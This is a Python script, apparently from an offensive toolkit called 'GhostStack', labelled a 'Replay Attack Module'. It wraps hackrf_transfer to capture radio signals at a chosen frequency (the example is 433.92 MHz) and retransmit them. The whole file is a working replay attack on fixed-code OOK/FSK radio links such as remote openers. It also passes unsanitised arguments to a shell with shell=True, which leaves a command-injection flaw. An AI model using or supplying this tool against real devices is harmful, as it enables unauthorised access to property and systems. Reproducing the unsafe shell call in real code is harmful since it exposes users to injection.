import subprocess
import sys
import os

# GhostStack: RF/EW Layer - Replay Attack Module
#
# A wrapper for 'hackrf_transfer' to capture and replay OOK/FSK signals.
# Useful for researching legacy RF links without FHSS.

def record_signal(filename, freq, sample_rate=2e6, duration=5):
    print(f"[*] Recording signal at {freq/1e6} MHz for {duration} seconds...")
    cmd = f"hackrf_transfer -r {filename} -f {int(freq)} -s {int(sample_rate)} -n {int(sample_rate * duration)}"
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"[+] Recording saved to {filename}")
    except subprocess.CalledProcessError as e:
        print(f"[-] HackRF Error: {e}")

def replay_signal(filename, freq, sample_rate=2e6):
    print(f"[!] REPLAYING signal from {filename} at {freq/1e6} MHz...")
    # Use -x gain for transmit
    cmd = f"hackrf_transfer -t {filename} -f {int(freq)} -s {int(sample_rate)} -x 20"
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"[+] Replay complete.")
    except subprocess.CalledProcessError as e:
        print(f"[-] HackRF Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 replay_attack.py <record|replay> <freq_hz> <filename>")
        print("Example: python3 replay_attack.py record 433920000 signal.raw")
        sys.exit(1)

    mode = sys.argv[1]
    freq = float(sys.argv[2])
    fname = sys.argv[3]

    if mode == "record":
        record_signal(fname, freq)
    elif mode == "replay":
        replay_signal(fname, freq)
    else:
        print("[-] Invalid mode. Use 'record' or 'replay'.")
